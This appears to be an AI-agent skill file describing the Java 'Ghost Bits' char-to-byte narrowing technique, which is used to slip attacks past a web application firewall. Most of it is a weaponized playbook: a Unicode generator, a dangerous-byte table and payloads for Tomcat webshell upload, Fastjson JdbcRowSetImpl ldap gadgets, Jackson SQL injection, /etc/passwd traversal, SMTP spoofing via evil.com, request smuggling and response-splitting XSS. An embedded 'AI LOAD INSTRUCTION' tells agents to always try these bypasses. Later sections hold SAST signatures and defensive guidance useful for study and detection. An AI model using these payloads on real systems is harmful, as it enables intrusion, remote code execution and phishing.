---
name: ghost-bits-cast-attack
description: >-
  Java "Ghost Bits" / Cast Attack playbook (Black Hat Asia 2026). Use when
  attacking Java services where 16-bit char is silently narrowed to 8-bit byte
  to bypass WAF/IDS for SQL injection, deserialization RCE, file upload
  (Webshell), path traversal, CRLF injection, request smuggling, and SMTP
  injection. Affects Tomcat, Spring, Jetty, Undertow, Vert.x, Jackson,
  Fastjson, Apache Commons BCEL, Apache HttpClient, Angus Mail, JDK
  HttpServer, Lettuce, Jodd, XMLWriter and re-enables many "patched" CVEs
  through WAF bypass.
---

# SKILL: Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive,
> not a standalone vulnerability class. Whenever you see (1) a Java backend,
> (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload,
> path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS
> try Ghost Bits variants of the payload before declaring it "blocked". The
> root cause is the silent loss of the high 8 bits when Java code narrows a
> 16-bit `char` to an 8-bit `byte` — the WAF sees a harmless Unicode
> character, the backend reconstructs the original ASCII attack byte. Base
> models almost never reach for this primitive.
>
> Source: Black Hat Asia 2026 talk *Cast Attack: A New Threat Posed by Ghost
> Bits in Java* by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), with contributor
> Zongzheng Zheng (@chun_springX).

## 0. RELATED ROUTING

Ghost Bits is a *bypass* primitive that re-enables payloads from many other
playbooks. Pair it with whichever attack family applies:

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when a Java
  backend is suspected and WAF rules block the literal payload, this is the
  first technique to try beyond classic encoding.
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — for
  Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants.
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty,
  Undertow, Vert.x URL decoding and `%2>` hex folding.
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat
  `RFC2231Utility` `filename*` Webshell upload.
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient
  `<= 4.5.9` (HTTPCLIENT-1974/1978) header CRLF.
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
  SMTP injection and JDK HttpServer response splitting.
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex`
  table-lookup truncation hides SQL keywords inside Unicode escapes.

### Advanced Reference

Load [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) when you need:

- Full byte-to-Ghost-character lookup table covering every printable ASCII
  byte 0x20–0x7E and the most useful control bytes (0x00, 0x09, 0x0A, 0x0D).
- Per-component affected version matrix and patch identifiers.
- Yaklang and Python one-liner payload generators (for `poc.HTTP`,
  `codec.Encode`, raw socket).
- "Multi-view normalization engine" pseudocode for blue-team WAF detection.

---

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON / quoted-printable | `Ģ`     | U+0122     |
| `%`         | 0x25 | URL encoding prefix, second decode    | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `0`         | 0x30 | hex digit construction                | `丰`       | U+4E30     |
| `1`         | 0x31 | hex digit construction                | `失`       | U+5931     |
| `2`         | 0x32 | hex digit construction                | `甲`       | U+7532     |
| `3`         | 0x33 | hex digit construction                | `耳`       | U+8033     |
| `;`         | 0x3B | command separator, header continuation | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `=`         | 0x3D | parameter / header value              | `Ƚ`        | U+023D     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `a`         | 0x61 | keyword `class`, alphabet             | `ᙡ`        | U+1661     |
| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |
| `e`         | 0x65 | hex digit                             | `来`       | U+6765     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `l`         | 0x6C | keyword `class`, `closure`            | `౬`        | U+0C6C     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.

Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
[crlf-injection](../crlf-injection/SKILL.md) for non-mail CRLF reuse.

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](../request-smuggling/SKILL.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

See [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) for affected-version
matrix and full per-component payload skeletons.

---

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

---

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---

## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

---

## 11. QUICK REFERENCE — KEY PAYLOADS

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader bypass (concept)
$$BCEL$$<each-byte-of-class-file-wrapped-in-a-Unicode-char>

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode + Jetty %2> folding
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 path read
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira mail hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer response splitting (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
  Java*. Speakers: Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue).
  Contributor: Zongzheng Zheng (@chun_springX).
- Real-world CVEs re-enabled: GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978.
- Patched components to upgrade past: Apache Commons BCEL >= 6.12.0,
  Fastjson 2.x latest, Apache HttpClient >= 4.5.10 (or migrate to 5.x),
  GeoServer >= 2.28.3, Openfire >= 5.0.4. Confirm vendor advisories before
  relying on any single version number.

---

## 12. CONFIRMING THE FINDING — BYPASS PROOF, NOT REFLECTION

Ghost Bits is a **filter-evasion** technique. The finding is therefore not "the payload was
accepted" — it is "the payload reached a sink that had a working filter for the original form."
Both halves must be shown.

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the **conventional** payload get blocked? | a filter exists and is in the path |
| 2 | Does the **Ghost Bits variant** of the same payload pass? | the evasion works against that filter |
| 3 | Does it reach the **sink**? (file read, command, traversal, deserialization) | the bypass has impact, not just acceptance |
| 4 | Does the effect differ from a **harmless** Ghost-Bits string? | the dangerous byte survived the cast |
| 5 | Is the filter a **library version** you identified? | names the upgrade, not a vague "WAF bypass" |
| 6 | Does the effect **disappear** when the component is patched? | closes the loop with the vendor advisory |

The canonical pair to report is: `payload_ascii` → `403`/sanitized, `payload_ghost` → effect observed.
Without the blocked control, a reviewer cannot tell whether the filter was bypassed or simply absent.

**Name the component and the version.** Ghost Bits is not a WAF trick in the abstract; it is a
specific cast behaviour of a specific parser (BCEL, Fastjson, HttpClient, GeoServer's GeoTools,
Openfire, Jetty `%2>`). The fix owner needs the component name and the CVE or the minimum fixed
version. "Ghost Bits bypasses the filter" is unactionable.

**Distinguish "accepted" from "effective".** A 200 response containing your string is a reflection.
You need the downstream effect: the file read, the command output, the traversal that resolved.

---

## 13. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **blocked conventional payload** — raw request plus the `403`/sanitized response | establishes that a filter exists; without it the bypass is unproven |
| The **Ghost Bits variant** — exact bytes, code points, and the full request | the technique is byte-exact; name the substituted characters and their `U+` code points |
| The **sink effect** (file bytes, command output, traversal result) | proves impact beyond filter acceptance |
| **The component and version** from a banner, error page, `pom.xml`, or stack trace | maps the finding to a CVE and a fixed version |
| A **harmless Ghost-Bits control** (same characters, benign payload) | isolates the dangerous byte as the cause |
| **Post-patch retest** result where the environment allows | closes the loop; turns a report into a verified fix |
| **Differential result** across two encodings of the same character | shows which parser folded and which did not |

Report the **component, version, cast, and effect**: "Jetty 12.0.x folds `%2>` to `/` after
validation, so `..%2>..%2>WEB-INF/web.xml` reaches the descriptor that `..%2f` cannot, because the
filter normalizes once before the cast", never "Ghost Bits bypasses path filters".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| Conventional payload also passes | the filter was never in the path; nothing was bypassed |
| Ghost-Bits string is reflected in the response | reflection, not sink reachability |
| Both encodings return identical errors | no cast difference; the component is not affected |
| Bypass works only against a **test** filter you wrote | not evidence about the target |
| The character is replaced by `?` (U+FFFD) in the output | the cast did not occur; substitution happened later |
| A different endpoint without the filter accepts the original | wrong component tested; not a bypass |
| Effect reproduced with a **plain ASCII** payload too | the finding is a missing filter, a different bug class |
| Only the **WAF** was tested, not the application parser | a generic mod_security rule is not the Ghost Bits class |

**The control is the blocked payload.** Without it you have not demonstrated evasion.

---

